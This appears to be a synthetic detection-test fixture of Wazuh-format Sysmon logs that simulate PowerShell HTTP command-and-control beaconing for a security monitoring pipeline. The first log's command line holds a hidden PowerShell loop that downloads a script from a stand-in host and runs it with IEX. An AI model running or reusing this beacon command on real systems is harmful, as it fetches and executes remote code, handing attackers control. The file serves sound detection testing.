{
  "_metadata": {
    "attack_id": "T1071.001",
    "variation": "002",
    "name": "PowerShell HTTP C2",
    "description": "PowerShell making outbound HTTP connections to C2 server",
    "expected_detection": "HIGH",
    "expected_soar": "c2-beaconing-detection",
    "kill_chain_phase": "command-and-control",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - PowerShell with WebClient",
      "sequence": 1,
      "timestamp": "2026-01-29T15:00:00.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: PowerShell HTTP C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.001"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "PowerShell HTTP C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.413793927",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:00:00.000",
              "processGuid": "{C2HTTP-001-0001-0001-000000000001}",
              "processId": "15000",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell.exe -nop -w hidden -c \"while($true){$c=(New-Object Net.WebClient).DownloadString('http://203.0.113.50/beacon');IEX $c;Start-Sleep 60}\"",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{C2HTTP-001-0001-0001-000000000000}",
              "parentProcessId": "14800",
              "parentImage": "C:\\Windows\\System32\\rundll32.exe",
              "parentCommandLine": "rundll32.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 22 - DNS query to C2 domain",
      "sequence": 2,
      "timestamp": "2026-01-29T15:00:01.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: PowerShell HTTP C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.001"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "PowerShell HTTP C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.283022513",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:00:01.000",
              "processGuid": "{C2HTTP-001-0001-0001-000000000001}",
              "processId": "15000",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "queryName": "203.0.113.50",
              "queryStatus": "0",
              "queryResults": "::ffff:203.0.113.50;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 3 - HTTP connection to C2",
      "sequence": 3,
      "timestamp": "2026-01-29T15:00:02.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: PowerShell HTTP C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.001"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "PowerShell HTTP C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.903811457",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:00:02.000",
              "processGuid": "{C2HTTP-001-0001-0001-000000000001}",
              "processId": "15000",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "10.1.1.50",
              "sourcePort": "61000",
              "destinationIp": "203.0.113.50",
              "destinationPort": "80"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 3 - Beacon interval (60 seconds later)",
      "sequence": 4,
      "timestamp": "2026-01-29T15:01:02.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: PowerShell HTTP C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.001"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "PowerShell HTTP C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.533853491",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:01:02.000",
              "processGuid": "{C2HTTP-001-0001-0001-000000000001}",
              "processId": "15000",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "10.1.1.50",
              "sourcePort": "61001",
              "destinationIp": "203.0.113.50",
              "destinationPort": "80"
            }
          }
        }
      }
    }
  ]
}